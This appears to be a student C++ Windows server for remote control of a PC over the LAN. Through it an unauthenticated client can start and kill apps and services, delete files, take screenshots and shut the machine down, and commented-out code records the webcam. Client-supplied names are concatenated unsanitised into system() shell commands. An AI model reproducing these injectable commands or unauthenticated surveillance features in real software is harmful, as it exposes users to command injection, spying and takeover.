#include "Server_library.h"
#include "Server_functions.h"

HHOOK keyboardHook = nullptr;
BOOL isConnected = false;
atomic<bool> isRecording(false);
thread webcamThread;

WSADATA initializeWinsock() {
    WSADATA ws;
    if (WSAStartup(MAKEWORD(2, 2), &ws) < 0) {
        cout << "WSA failed to initialize" << endl;
    }
    else cout << "WSA initialized" << endl;

    return ws;
}

SOCKET initializeSocket() {
    SOCKET nSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (nSocket < 0) {
        cout << "The Socket not opened" << endl;
    }
    else
        cout << "The Socket opened successfully" << endl;

    return nSocket;
}

sockaddr_in initializeServerSocket() {
    sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_port = htons(9909);
    //server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_addr.s_addr = INADDR_ANY;
    memset(&(server.sin_zero), 0, 8);

    return server;
}

// Hàm lấy địa chỉ IP của máy
string getLocalIPAddress() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
        cerr << "Error getting hostname: " << WSAGetLastError() << endl;
        return "";
    }

    struct addrinfo hints, * info;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET; // Chỉ IPv4
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(hostname, NULL, &hints, &info) != 0) {
        cerr << "Error getting local IP: " << WSAGetLastError() << endl;
        return "";
    }

    sockaddr_in* addr = (sockaddr_in*)info->ai_addr;
    char ipStr[INET_ADDRSTRLEN]; // Định nghĩa kích thước cho IPv4
    inet_ntop(AF_INET, &(addr->sin_addr), ipStr, INET_ADDRSTRLEN); // Chuyển địa chỉ thành chuỗi
    freeaddrinfo(info);

    return string(ipStr);
}

void sendBroadcast() {
    SOCKET udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket == INVALID_SOCKET) {
        cout << "Failed to create UDP socket: " << WSAGetLastError() << endl;
        return;
    }
    cout << "UDP socket created successfully for broadcasting" << endl;

    // Cho phép gửi broadcast
    BOOL broadcastEnable = TRUE;
    if (setsockopt(udpSocket, SOL_SOCKET, SO_BROADCAST, (char*)&broadcastEnable, sizeof(broadcastEnable)) < 0) {
        cout << "Failed to enable broadcast: " << WSAGetLastError() << endl;
        closesocket(udpSocket);
        return;
    }

    sockaddr_in broadcastAddr;
    broadcastAddr.sin_family = AF_INET;
    broadcastAddr.sin_port = htons(9909);
    broadcastAddr.sin_addr.s_addr = INADDR_BROADCAST;

    string serverIP = getLocalIPAddress();
    if (serverIP.empty()) {
        cout << "Unable to get server IP address" << endl;
        closesocket(udpSocket);
        return;
    }

    string message = "Server_IP=" + serverIP + ";Port=9909";
    
    cout << message << endl;

    cout << "Broadcasting server information..." << endl;
    while (!isConnected) {
        sendto(udpSocket, message.c_str(), strlen(message.c_str()), 0,
            (sockaddr*)&broadcastAddr, sizeof(broadcastAddr));
        Sleep(5000);
    }

    cout << "Broadcast stopped." << endl;
    closesocket(udpSocket);
}

void bindAndListen(SOCKET& nSocket, sockaddr_in& server) {
    int nRet = 0;
    nRet = ::bind(nSocket, (sockaddr*)&server, sizeof(sockaddr));

    if (nRet < 0) {
        cout << "Failed to bind to local port" << endl;
        return;
    }
    else cout << "Successfully bind to local port" << endl;

    // Listen the request from client 
    nRet = listen(nSocket, 5);
    if (nRet < 0) {
        cout << "Failed to start listen to local port" << endl;
    }
    else cout << "Started listening to local port" << endl;
}

SOCKET acceptRequestFromClient(SOCKET nSocket) {
    SOCKET clientSocket;
    sockaddr_in client;
    int clientSize = sizeof(client);

    clientSocket = accept(nSocket, (sockaddr*)&client, &clientSize);

    if (clientSocket < 0) {
        cout << "Failed to accept connection" << endl;
        return EXIT_FAILURE;
    }
    else {
        isConnected = true;
        cout << "Client connected successfully" << endl;
    }

    return clientSocket;
}

void ReceiveAndSend(SOCKET& clientSocket, SOCKET& nSocket) {
    string receiveBuffer, sendBuffer;

    while (true) {
        receiveBuffer.resize(512);

        int recvResult = recv(clientSocket, &receiveBuffer[0], receiveBuffer.size(), 0);

        if (recvResult <= 0) {
            cout << "Failed to receive data from client" << endl;
            break;
        }

        else {
            receiveBuffer.resize(recvResult);

            // Kiểm tra xem có yêu cầu thoát hay không
            if (receiveBuffer == "endProgram") {
                cout << "Exit command received. Closing connection" << endl;
                break;
            }

            thread([&clientSocket, receiveBuffer]() {
                processRequest(clientSocket, receiveBuffer);
                }).detach();
        }
    }
}

void closeConected(SOCKET clientSocket, SOCKET nSocket) {
    // close connected with client
    closesocket(clientSocket);

    // close socket server
    closesocket(nSocket);
    WSACleanup();
}

// Hàm khởi tạo và quản lý các kết nối từ client

void handleServer() {
    // Khởi tạo Winsock
    WSADATA ws = initializeWinsock();

    // Tạo socket
    SOCKET nSocket = initializeSocket();

    // Cấu hình server socket
    sockaddr_in server = initializeServerSocket();

    // Chạy broadcast trên luồng riêng
    thread broadcastThread(sendBroadcast);
    broadcastThread.detach();

    // Liên kết và bắt đầu lắng nghe
    bindAndListen(nSocket, server);

    // Chấp nhận kết nối từ client
    SOCKET clientSocket = acceptRequestFromClient(nSocket);

    // Nhận và gửi các gói tin
    ReceiveAndSend(clientSocket, nSocket);

    // Đóng phiên kết nối
    closeConected(clientSocket, nSocket);
}


bool sendFile(SOCKET& clientSocket, const string& fileName) {
    ifstream file(fileName, ios::binary);

    if (!file) {
        cout << "Failed to open file " << fileName << endl;
        return false;
    }

    string fileBuffer((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());

    int fileSize = fileBuffer.size();

    send(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

    int bytesSent = 0;

    while (bytesSent < fileSize) {
        int bytesToSend = min(fileSize - bytesSent, 1024);
        int result = send(clientSocket, fileBuffer.c_str() + bytesSent, bytesToSend, 0);

        if (result == SOCKET_ERROR) {
            cout << "Failed to send file data, error: " << WSAGetLastError() << endl;
            return false;
        }

        bytesSent += result;
    }

    return true;
}

void sendJSON(SOCKET& clientSocket, const string& jsonResponse) {
    int jsonSize = jsonResponse.size();

    // Gửi kích thước chuỗi JSON trước
    int result = send(clientSocket, reinterpret_cast<char*>(&jsonSize), sizeof(jsonSize), 0);
    if (result == SOCKET_ERROR) {
        cout << "Failed to send JSON size, error: " << WSAGetLastError() << endl;
        return;
    }

    // Gửi nội dung chuỗi JSON
    int bytesSent = 0;
    while (bytesSent < jsonSize) {
        int bytesToSend = min(jsonSize - bytesSent, 1024);
        result = send(clientSocket, jsonResponse.c_str() + bytesSent, bytesToSend, 0);

        if (result == SOCKET_ERROR) {
            cout << "Failed to send JSON data, error: " << WSAGetLastError() << endl;
            break;
        }
        bytesSent += result;
    }
}

string startApp(string name) {
    string command = "start " + name;
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = "startApp";
    jsonResponse["nameObject"] = name;

    if (result == 0)
        jsonResponse["result"] = "Successfully started " + name;
    else
        jsonResponse["result"] = "Failed to start " + name;

    return jsonResponse.dump();
}

string startService(string name) {
    // Thực thi lệnh để khởi động dịch vụ
    string command = "net start " + name + " > nul 2>&1";
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] == "startService";
    jsonResponse["nameObject"] = name;

    string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";

    if (result == 0) {
        jsonResponse["result"] = "Service " + name + " has been started successfully.";
    }
    else if (system(checkCommand.c_str()) == 0) {
        jsonResponse["result"] = "Service " + name + " is already running.";
    }
    else {
        jsonResponse["result"] = "Failed to start service " + name + ". Please check the service status.";
    }

    return jsonResponse.dump();
}

// Start, stop webcam

//bool createWebcamVideo(int duration) {
//    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
//
//    // Mở camera
//    cv::VideoCapture cap(0); // Camera mặc định (0)
//    if (!cap.isOpened()) {
//        // Nếu không mở được camera, trả về mà không in thông báo
//        return false;
//    }
//
//    // Đặt các thông số quay video
//    int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
//    int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
//    cv::Size frame_size(frame_width, frame_height);
//    int fps = 30; // Đặt fps hợp lý (có thể điều chỉnh tùy vào camera)
//
//    // Đường dẫn file video đầu ra
//    std::string output_file = "output.avi";
//
//    // Định dạng video codec và mở VideoWriter
//    cv::VideoWriter video(output_file,
//        cv::VideoWriter::fourcc('M', 'J', 'P', 'G'),
//        fps, frame_size, true);
//    if (!video.isOpened()) {
//        // Nếu không thể mở video writer, trả về mà không in thông báo
//        return false;
//    }
//
//    // Quay video trong thời gian người dùng nhập
//    cv::Mat frame;
//    auto start_time = std::chrono::steady_clock::now();
//    int elapsed_time = 0; // Thời gian đã quay
//    while (true) {
//        cap >> frame; // Đọc khung hình từ camera
//        if (frame.empty()) {
//            break;
//        }
//
//        // Ghi khung hình vào file video
//        video.write(frame);
//
//        // Hiển thị khung hình trên cửa sổ
//        cv::imshow("Video Recording", frame);
//
//        // Kiểm tra thời gian đã quay
//        auto current_time = std::chrono::steady_clock::now();
//        elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
//
//        // Nếu đã quay đủ thời gian, dừng lại
//        if (elapsed_time >= duration) break;
//
//        // Nhấn phím ESC để thoát sớm
//        if (cv::waitKey(1) == 27) break;  // Dùng thời gian ngắn hơn cho waitKey để không làm giảm tốc độ quay
//    }
//
//    // Giải phóng tài nguyên
//    cap.release();
//    video.release();
//    cv::destroyAllWindows();
//
//    return true;
//}
//
//string startWebcam(SOCKET clientSocket, int duration) {
//
//    bool result = createWebcamVideo(duration);
//
//    sendFile(clientSocket, "output.avi");
//
//    json jsonResponse;
//
//    jsonResponse["title"] = "startWebcam";
//
//    if (result)
//        jsonResponse["result"] = "Successfully started webcam";
//    else
//        jsonResponse["result"] = "Failed to start webcam";
//
//    return jsonResponse.dump();
//}

//bool createWebcamVideo(int duration) {
//    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
//
//    // Khởi tạo COM ở chế độ Multithreaded
//    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
//    if (FAILED(hr)) {
//        return false;
//    }
//
//    // Mở camera
//    cv::VideoCapture cap(0);
//    if (!cap.isOpened()) {
//        CoUninitialize();
//        return false;
//    }
//
//    // Lấy kích thước khung hình và các thông số
//    int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
//    int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
//    cv::Size frame_size(frame_width, frame_height);
//    int fps = 30;
//
//    // Tạo VideoWriter với codec AVC1
//    string output_file = "output.mp4";
//    cv::VideoWriter video(output_file,
//        cv::VideoWriter::fourcc('a', 'v', 'c', '1'),  // Codec AVC1
//        fps, frame_size, true);
//
//    if (!video.isOpened()) {
//        cap.release();
//        CoUninitialize();
//        return false;
//    }
//
//    // Bắt đầu quay video
//    cv::Mat frame;
//    auto start_time = chrono::steady_clock::now();
//    int elapsed_time = 0;
//    bool is_recording = true;  // Biến để xác định trạng thái ghi video
//
//
//    while (true) {
//        cap >> frame;
//        if (frame.empty()) {
//            break;
//        }
//
//        // Nếu còn thời gian và đang quay, ghi video
//        if (is_recording) {
//            video.write(frame);  // Ghi khung hình vào file
//        }
//
//        // Hiển thị video
//        cv::imshow("Video Recording", frame);
//
//        // Kiểm tra thời gian quay
//        auto current_time = chrono::steady_clock::now();
//        elapsed_time = chrono::duration_cast<chrono::seconds>(current_time - start_time).count();
//
//        // Sau khi hết thời gian quay, dừng ghi nhưng vẫn tiếp tục nhận khung hình
//        if (elapsed_time >= duration && is_recording) {
//            is_recording = false;
//            video.release();
//        }
//
//        // Kiểm tra phím nhấn
//        int key = cv::waitKey(1) & 0xFF;
//
//        // Kiểm tra nếu cửa sổ bị đóng
//        if (cv::getWindowProperty("Video Recording", cv::WND_PROP_VISIBLE) < 1) {
//            break;
//        }
//    }
//
//    // Dọn dẹp tài nguyên
//    cap.release();
//    cv::destroyAllWindows();
//    CoUninitialize();
//
//    return true;
//}

//string startWebcam(SOCKET clientSocket, int duration) {
//
//    bool result = createWebcamVideo(duration);
//
//    sendFile(clientSocket, "output.mp4");
//
//    json jsonResponse;
//
//    jsonResponse["title"] = "startWebcam";
//
//    if (result)
//        jsonResponse["result"] = "Successfully started webcam";
//    else
//        jsonResponse["result"] = "Failed to start webcam";
//
//    return jsonResponse.dump();
//}

//string stopWebcam() {
//    string command = "powershell -Command \"Get-Process| Where-Object { $_.Name -eq 'WindowsCamera' } | Stop-Process\"";
//    int result = system(command.c_str());
//
//    json jsonResponse;
//
//    jsonResponse["title"] = "stopWebcam";
//
//    if (result == 0)
//        jsonResponse["result"] = "Successfully stopped webcam";
//    else
//        jsonResponse["result"] = "Failed to stop webcam";
//
//    return jsonResponse.dump();
//}

//bool createWebcamVideo(int duration) {
//    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
//
//    // Khởi tạo COM ở chế độ Multithreaded
//    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
//    if (FAILED(hr)) {
//        return false;
//    }
//
//    // Mở camera
//    cv::VideoCapture cap(0);
//    if (!cap.isOpened()) {
//        CoUninitialize();
//        return false;
//    }
//
//    // Lấy kích thước khung hình và các thông số
//    int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
//    int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
//    cv::Size frame_size(frame_width, frame_height);
//    int fps = 30;
//
//    // Tạo VideoWriter với codec AVC1
//    string output_file = "output.mp4";
//    cv::VideoWriter video(output_file,
//        cv::VideoWriter::fourcc('a', 'v', 'c', '1'),  // Codec AVC1
//        fps, frame_size, true);
//
//    if (!video.isOpened()) {
//        cap.release();
//        CoUninitialize();
//        return false;
//    }
//
//    // Bắt đầu quay video
//    cv::Mat frame;
//    auto start_time = chrono::steady_clock::now();
//    int elapsed_time = 0;
//    bool is_recording = true;  // Biến để xác định trạng thái ghi video
//
//
//    while (isRecording) {
//        cap >> frame;
//        if (frame.empty()) {
//            break;
//        }
//
//        // Nếu còn thời gian và đang quay, ghi video
//        if (is_recording) {
//            video.write(frame);  // Ghi khung hình vào file
//        }
//
//        // Hiển thị video
//        cv::imshow("Video Recording", frame);
//
//        // Kiểm tra thời gian quay
//        auto current_time = chrono::steady_clock::now();
//        elapsed_time = chrono::duration_cast<chrono::seconds>(current_time - start_time).count();
//
//        // Sau khi hết thời gian quay, dừng ghi nhưng vẫn tiếp tục nhận khung hình
//        if (elapsed_time >= duration && is_recording) {
//            is_recording = false;
//            video.release();
//        }
//
//        // Kiểm tra phím nhấn
//        int key = cv::waitKey(1) & 0xFF;
//
//        // Kiểm tra nếu cửa sổ bị đóng
//        if (cv::getWindowProperty("Video Recording", cv::WND_PROP_VISIBLE) < 1) {
//            break;
//        }
//    }
//
//    // Dọn dẹp tài nguyên
//    cap.release();
//    cv::destroyAllWindows();
//    CoUninitialize();
//
//    return true;
//}

//
//string startWebcam(SOCKET clientSocket) {
//    if (isRecording) {
//        return R"({"title":"startWebcam","result":"Webcam is already recording"})";
//    }
//
//    isRecording = true;
//    webcamThread = thread([]() {
//        bool result = createWebcamVideo(10); // Quay video trong 10 giây
//        });
//    // sendFile(clientSocket, "output.mp4");
//    // bool result=createWebcamVideo(10);
//    json jsonResponse;
//
//    jsonResponse["title"] = "startWebcam";
//
//    /*if (result)
//        jsonResponse["result"] = "Successfully started webcam";
//    else
//        jsonResponse["result"] = "Failed to start webcam";*/
//    jsonResponse["result"] = "Successfully started webcam";
//
//    return jsonResponse.dump();
//}
//
//string stopWebcam(SOCKET clientSocket) {
//    if (!isRecording) {
//        return R"({"title":"stopWebcam","result":"Webcam is not recording"})";
//    }
//
//    isRecording = false; // Yêu cầu dừng quay video
//
//    if (webcamThread.joinable()) {
//        webcamThread.join(); // Chờ thread webcam hoàn thành
//    }
//    string command = "powershell -Command \"Get-Process| Where-Object { $_.Name -eq 'WindowsCamera' } | Stop-Process\"";
//    int result = system(command.c_str());
//
//    sendFile(clientSocket, "output.mp4");
//    json jsonResponse;
//
//    jsonResponse["title"] = "stopWebcam";
//
//    if (result == 0)
//        jsonResponse["result"] = "Successfully stopped webcam";
//    else
//        jsonResponse["result"] = "Failed to stop webcam";
//
//    return jsonResponse.dump();
//}

string stopApp(string name) {
    string command = "taskkill /IM " + name + ".exe /F";
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = "stopApp";
    jsonResponse["nameObject"] = name;

    if (result == 0)
        jsonResponse["result"] = "Successfully stopped " + name;
    else {
        FILE* pipe = _popen(command.c_str(), "r");
        char buffer[128];
        string line = "";
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            line += buffer;  
        }

        jsonResponse["result"] = "The application with name " + name + " is inactive";
    }

    return jsonResponse.dump();
}

string stopService(string name) {
    // Thực thi lệnh để dừng dịch vụ
    string command = "net stop " + name + " > nul 2>&1"; // Ẩn thông báo lỗi CMD
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = "stopService";
    jsonResponse["nameObject"] = name;

    // Kiểm tra trạng thái dịch vụ
    string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";

    if (result == 0) {
        jsonResponse["result"] = "Service " + name + " has been stopped successfully.";
    }
    else if (system(checkCommand.c_str()) != 0) {
        jsonResponse["result"] = "Service " + name + " is already stopped.";
    }
    else {
        jsonResponse["result"] = "Failed to stop service " + name + ". Please check the service status.";
    }

    return jsonResponse.dump();
}

string listApps() {
    vector<vector<string>> appList = getRunningApps();

    json jsonResponse;

    jsonResponse["title"] = "listApps";

    if (!appList.empty()) {
        jsonResponse["result"] = "Successfully listed applications";
        writeAppListToFile(appList);
    }
    else
        jsonResponse["result"] = "Failed to list applications";

    return jsonResponse.dump();
}

// Hàm để ghi dữ liệu vào tệp listApps.txt
void writeAppListToFile(const vector<vector<string>>& apps) {
    ofstream outFile("AppList.txt");

    if (!outFile) {
        cerr << "Failed to open file." << endl;
        return;
    }

    // Ghi tiêu đề bảng vào tệp
    outFile << setw(30) << left << "Application Name"
        << setw(10) << left << "PID"
        << setw(25) << left << "Memory Usage (GB)" << endl;
    // << setw(50) << left << "Path" 
    outFile << string(60, '-') << endl;

    // Ghi dữ liệu các tiến trình vào tệp
    for (const auto& app : apps) {
        double memoryInGB = stod(app[2]);  // Chuyển chuỗi thành số thực
        outFile << setw(30) << left << app[0]        // Application Name
            << setw(15) << left << app[1]        // PID
            << setw(20) << left << fixed << setprecision(2) << memoryInGB   // Memory Usage in GB
            // << setw(50) << left << app[3]        // Path
            << endl;
    }

    outFile.close();
}

vector<vector<string>> getRunningApps() {
    // Lệnh PowerShell để lấy thông tin về các tiến trình (Name, PID, Memory Usage, Path)
    string command = R"(powershell -Command "Get-Process | Where-Object {$_.mainwindowhandle -ne 0} | Select-Object Name,Id,WorkingSet64,Path | Format-Table -HideTableHeaders")";

    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        cout << "Failed to run command." << endl;
        return {};
    }

    vector<vector<string>> appList;
    char buffer[1024]; // Đảm bảo kích thước đủ lớn để chứa dữ liệu

    // Đọc dữ liệu từ PowerShell và xử lý
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        string line(buffer);
        line.erase(remove(line.begin(), line.end(), '\n'), line.end());
        line.erase(remove(line.begin(), line.end(), '\r'), line.end());

        // Bỏ qua các dòng trống
        if (line.empty()) {
            continue;
        }

        istringstream ss(line);
        vector<string> appDetails;

        string name, pid, memory;

        // Đọc các giá trị từ dòng
        ss >> name >> pid >> memory;

        // Chuyển đổi Memory Usage từ byte sang GB
        long long memoryInBytes = stoll(memory); // Chuyển chuỗi sang long long
        double memoryInGB = static_cast<double>(memoryInBytes) / (1024 * 1024 * 1024); // Chuyển từ byte sang GB

        // Lưu lại thông tin
        appDetails.push_back(name);
        appDetails.push_back(pid);
        appDetails.push_back(to_string(memoryInGB));
        // appDetails.push_back(path);
        appList.push_back(appDetails);
    }

    _pclose(pipe);
    return appList;
}

// listServices

// Hàm chuyển đổi từ Wide Char (Unicode) sang std::string (UTF-8)
string ConvertWideCharToString(LPCWSTR wideCharStr) {
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wideCharStr, -1, nullptr, 0, nullptr, nullptr);
    string result(bufferSize - 1, 0); // bufferSize bao gồm ký tự null cuối
    WideCharToMultiByte(CP_UTF8, 0, wideCharStr, -1, &result[0], bufferSize, nullptr, nullptr);
    return result;
}

// Hàm lấy mô tả của dịch vụ
string GetServiceDescription(SC_HANDLE hService) {
    LPQUERY_SERVICE_CONFIG serviceConfig;
    DWORD bytesNeeded;
    string description = "No description available";
    if (QueryServiceConfig(hService, NULL, 0, &bytesNeeded) || GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        serviceConfig = (LPQUERY_SERVICE_CONFIG)malloc(bytesNeeded);
        if (QueryServiceConfig(hService, serviceConfig, bytesNeeded, &bytesNeeded)) {
            description = ConvertWideCharToString(serviceConfig->lpDisplayName);
        }
        free(serviceConfig);
    }
    return description;
}

// Hàm cắt chuỗi nếu quá dài
string TruncateString(const string& str, size_t maxLength) {
    if (str.length() > maxLength) {
        return str.substr(0, maxLength) + "...";  // Cắt chuỗi và thêm dấu ba chấm
    }
    return str;
}

// Hàm liệt kê tên dịch vụ, PID, mô tả và trạng thái của chúng
vector<pair<string, tuple<int, string, string>>> ListAllServices() {
    vector<pair<string, tuple<int, string, string>>> servicesInfo;

    SC_HANDLE hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager == nullptr) {
        cerr << "Unable to open Service Control Manager: " << GetLastError() << endl;
        return servicesInfo;
    }

    DWORD dwBytesNeeded = 0, dwServicesReturned = 0, dwResumeHandle = 0;
    DWORD dwBufferSize = 0;
    LPBYTE lpBuffer = nullptr;

    // Lấy kích thước bộ nhớ cần thiết
    EnumServicesStatusEx(
        hSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32,
        SERVICE_STATE_ALL,
        lpBuffer,
        dwBufferSize,
        &dwBytesNeeded,
        &dwServicesReturned,
        &dwResumeHandle,
        nullptr
    );

    // Cấp phát bộ nhớ
    dwBufferSize = dwBytesNeeded;
    lpBuffer = new BYTE[dwBufferSize];
    if (!EnumServicesStatusEx(
        hSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32,
        SERVICE_STATE_ALL,
        lpBuffer,
        dwBufferSize,
        &dwBytesNeeded,
        &dwServicesReturned,
        &dwResumeHandle,
        nullptr
    )) {
        cerr << "Unable to list services: " << GetLastError() << endl;
        delete[] lpBuffer;
        CloseServiceHandle(hSCManager);
        return servicesInfo;
    }

    // Thu thập tên dịch vụ, PID, mô tả và trạng thái của các dịch vụ
    auto* services = reinterpret_cast<LPENUM_SERVICE_STATUS_PROCESS>(lpBuffer);
    for (DWORD i = 0; i < dwServicesReturned; ++i) {
        string serviceName = ConvertWideCharToString(services[i].lpServiceName);
        int pid = services[i].ServiceStatusProcess.dwProcessId;

        // Trạng thái dịch vụ
        string status = (services[i].ServiceStatusProcess.dwCurrentState == SERVICE_RUNNING) ? "Running" : "Stopped";

        // Lấy mô tả dịch vụ
        SC_HANDLE hService = OpenService(hSCManager, services[i].lpServiceName, SERVICE_QUERY_CONFIG);
        string description = GetServiceDescription(hService);
        CloseServiceHandle(hService);

        // Cắt ngắn tên dịch vụ và mô tả nếu quá dài
        serviceName = TruncateString(serviceName, 30);  // Cắt tên dịch vụ nếu quá 40 ký tự
        description = TruncateString(description, 30);  // Cắt mô tả nếu quá 40 ký tự

        // Thêm vào vector
        servicesInfo.push_back({ serviceName, make_tuple(pid, description, status) });
    }

    // Dọn dẹp bộ nhớ
    delete[] lpBuffer;
    CloseServiceHandle(hSCManager);

    return servicesInfo;
}

// Hàm ghi dữ liệu vào file
void writeServicesListToFile(const vector<pair<string, tuple<int, string, string>>>& services) {
    ofstream outputFile("ServiceList.txt");

    if (!outputFile.is_open()) {
        cerr << "Unable to open file for writing!" << endl;
        return;
    }

    // Ghi tiêu đề cho các cột vào file
    outputFile << left << setw(40) << "Name"
        << setw(10) << "PID"
        << setw(40) << "Description"
        << setw(15) << "Status" << endl;
    outputFile << string(100, '-') << endl;

    // Ghi ra các dịch vụ và thông tin của chúng vào file
    for (const auto& service : services) {
        const auto& [name, serviceInfo] = service;
        const auto& [pid, description, status] = serviceInfo;

        // Ghi thông tin theo đúng định dạng cột vào file
        outputFile << left << setw(40) << name
            << setw(10) << pid
            << setw(40) << description
            << setw(15) << status << endl;
    }

    // Đóng file
    outputFile.close();
}

string listServices() {
    vector<pair<string, tuple<int, string, string>>> servicesList = ListAllServices();

    json jsonResponse;

    jsonResponse["title"] = "listServices";

    if (!servicesList.empty()) {
        jsonResponse["result"] = "Successfully listed services";
        writeServicesListToFile(servicesList);
    }
    else jsonResponse["result"] = "Failed to list services";

    return jsonResponse.dump();
}

string listProcess() {
    json jsonRespone;

    jsonRespone["title"] = "listProcess";

    int result = system("tasklist > ProcessList.txt");

    if (result == 0) {
        jsonRespone["result"] = "Successfully listed process";

    }
    else {
        jsonRespone["result"] = "Failed to list services";
    }

    return jsonRespone.dump();
}

// Thực hiện chức năng restart and shutdown

void restart() {
    // Tắt tất cả tiến trình đang chạy
    string command = "taskkill /F /FI \"STATUS eq RUNNING\"";
    system(command.c_str());

    // Khởi động lại máy tính 
    command = "shutdown /r /t 0";
    system(command.c_str());
}

void shutdown() {
    // Tắt tất cả tiến trình đang chạy
    string command = "taskkill /F /FI \"STATUS eq RUNNING\"";
    system(command.c_str());

    // Tắt máy tính 
    command = "shutdown /s /t 0";
    system(command.c_str());
}

// Delete file
string deleteFile(string& filePath) {
    json jsonResponse;

    jsonResponse["title"] = "deleteFile";

    if (remove(filePath.c_str()) == 0) {
        jsonResponse["result"] = "File has been successfully deleted!";
    }
    else {
        jsonResponse["result"] = "Failed to delete file";
    }

    return jsonResponse.dump();
}

// Copy file
string copyFile(string sourceFile, string destinationFile) {
    ifstream source(sourceFile, ios::binary);

    json jsonResponse;

    jsonResponse["title"] = "Copy file";

    if (!source) {
        jsonResponse["result"] = "Source file does not exist or could not be opened!";
        return jsonResponse.dump();
    }

    ofstream destination(destinationFile, ios::binary);

    if (!destination) {
        jsonResponse["result"] = "Could not create destination file!";
        return jsonResponse.dump();
    }

    destination << source.rdbuf();

    jsonResponse["result"] = "File copied successfully!";

    return jsonResponse.dump();
}

// Screenshot

// Hàm tạo tên tệp với thời gian hiện tại
string generateFileName() {
    time_t now = time(0);
    tm localtime;
    localtime_s(&localtime, &now);

    stringstream ss;
    ss << "screenshot_"
        << 1900 + localtime.tm_year << "-"
        << 1 + localtime.tm_mon << "-"
        << localtime.tm_mday << "_"
        << localtime.tm_hour << "-"
        << localtime.tm_min << "-"
        << localtime.tm_sec << ".bmp";

    return ss.str();
}

// Hàm chụp ảnh màn hình và lưu vào HBITMAP
HBITMAP captureScreen(int& screenWidth, int& screenHeight) {
    HWND hwndDesktop = GetDesktopWindow();
    HDC hdcScreen = GetDC(hwndDesktop);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    RECT screenRect;
    GetWindowRect(hwndDesktop, &screenRect);
    screenWidth = screenRect.right;
    screenHeight = screenRect.bottom;

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    ReleaseDC(hwndDesktop, hdcScreen);
    DeleteDC(hdcMem);

    return hBitmap;
}

// Hàm lưu HBITMAP vào tệp BMP với tên duy nhất
bool saveHBitmapToBMP(HBITMAP hBitmap, int width, int height, const string& folderPath) {
    string fileName = folderPath + "\\" + generateFileName();

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPFILEHEADER fileHeader;
    BITMAPINFOHEADER infoHeader;

    fileHeader.bfType = 0x4D42;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fileHeader.bfSize = fileHeader.bfOffBits + bmp.bmWidthBytes * height;
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;

    infoHeader.biSize = sizeof(BITMAPINFOHEADER);
    infoHeader.biWidth = width;
    infoHeader.biHeight = height;
    infoHeader.biPlanes = 1;
    infoHeader.biBitCount = 32;
    infoHeader.biCompression = BI_RGB;
    infoHeader.biSizeImage = bmp.bmWidthBytes * height;
    infoHeader.biXPelsPerMeter = 0;
    infoHeader.biYPelsPerMeter = 0;
    infoHeader.biClrUsed = 0;
    infoHeader.biClrImportant = 0;

    ofstream outFile(fileName, ios::out | ios::binary);
    if (!outFile) {
        cerr << "Error: Failed to save BMP file!" << endl;
        return false;
    }

    outFile.write(reinterpret_cast<const char*>(&fileHeader), sizeof(fileHeader));
    outFile.write(reinterpret_cast<const char*>(&infoHeader), sizeof(infoHeader));

    HDC hdc = GetDC(NULL);
    BYTE* bmpData = new BYTE[bmp.bmWidthBytes * height];
    GetDIBits(hdc, hBitmap, 0, height, bmpData, (BITMAPINFO*)&infoHeader, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    outFile.write(reinterpret_cast<const char*>(bmpData), bmp.bmWidthBytes * height);
    delete[] bmpData;

    outFile.close();
    cout << "Successfully saved the screenshot to the file:  " << fileName << endl;
    return true;
}

